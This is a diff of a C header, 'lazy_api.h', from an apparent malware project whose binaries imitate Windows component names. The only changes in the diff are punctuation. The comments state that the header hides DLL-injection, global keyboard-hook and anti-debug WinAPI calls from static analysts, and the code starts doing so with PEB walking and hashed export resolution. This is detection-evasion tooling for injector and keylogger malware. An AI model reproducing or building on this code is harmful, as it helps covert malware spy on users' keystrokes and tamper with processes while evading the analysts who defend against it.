@@ -1,15 +1,15 @@
 /* ================================================================== *
- * lazy_api.h — Hide selected WinAPI calls from the IAT.               *
+ * lazy_api.h -- Hide selected WinAPI calls from the IAT.               *
  *                                                                    *
  * Problem: dumpbin /IMPORTS dwmapiext.dll (or sihost.exe) lists     *
  * every WinAPI we call. Certain functions are dead giveaways for a   *
  * static analyst:                                                     *
  *   - CreateRemoteThread + WriteProcessMemory + VirtualAllocEx       *
- *     → "this is a DLL injector"                                     *
+ *     -> "this is a DLL injector"                                     *
  *   - SetWindowsHookExW + WH_KEYBOARD_LL                             *
- *     → "this hooks the keyboard globally"                           *
+ *     -> "this hooks the keyboard globally"                           *
  *   - NtQueryInformationProcess with ProcessDebugPort                *
- *     → "this does anti-debug"                                       *
+ *     -> "this does anti-debug"                                       *
  *                                                                    *
  * Fix: resolve those APIs at RUNTIME via PEB-walk + export-table     *
  * hash lookup. No plaintext function name string ever hits .rdata.   *
@@ -20,7 +20,7 @@
  *   HANDLE h = pOpenProcess(...);                                     *
  *                                                                    *
  * Constraints:                                                        *
- *   1. C only (no C++ decltype magic — keeps compat with our .c     *
+ *   1. C only (no C++ decltype magic -- keeps compat with our .c     *
  *      files). Caller provides the function-pointer type.             *
  *   2. Custom hash algorithm inlined per call so `strings` doesn't    *
  *      find "kernel32.dll" or API name literals.                     *
@@ -56,7 +56,7 @@ static inline uint32_t svc_hash_a(const char *s) {
 }
 
 /* Widechar variant for module names (PEB LDR entries are UNICODE_STRING).
- * Case-insensitive comparison — Windows treats module names as CI. */
+ * Case-insensitive comparison -- Windows treats module names as CI. */
 static inline uint32_t svc_hash_w(const wchar_t *s) {
     uint32_t h = 0x811C9DC5u ^ 0x53564C43u;
     while (*s) {
@@ -70,7 +70,7 @@ static inline uint32_t svc_hash_w(const wchar_t *s) {
 
 /* Locate a loaded module by wide-name hash via PEB walk. Returns
  * NULL if not currently loaded (caller must LoadLibrary first, but
- * we don't for the DLLs listed in lazy_api.c — they're all guaranteed-
+ * we don't for the DLLs listed in lazy_api.c -- they're all guaranteed-
  * loaded ntdll/kernel32/user32/advapi32 dependents. */
 void *lazy_get_module_by_hash(uint32_t module_name_hash_w);
 
@@ -94,7 +94,7 @@ void *lazy_resolve(uint32_t module_name_hash_w, uint32_t proc_name_hash);
  * function of a compile-time-constant string and folds it to a u32).
  *
  * The hash values DO end up in the binary as immediates but they look
- * like normal constants — analysts have to guess which of the ~200
+ * like normal constants -- analysts have to guess which of the ~200
  * distinct constants are import hashes vs random program constants,
  * then brute-force reverse each hash against a Windows API dictionary.
  * That's hours of work vs the current 30 seconds of dumpbin /IMPORTS. */
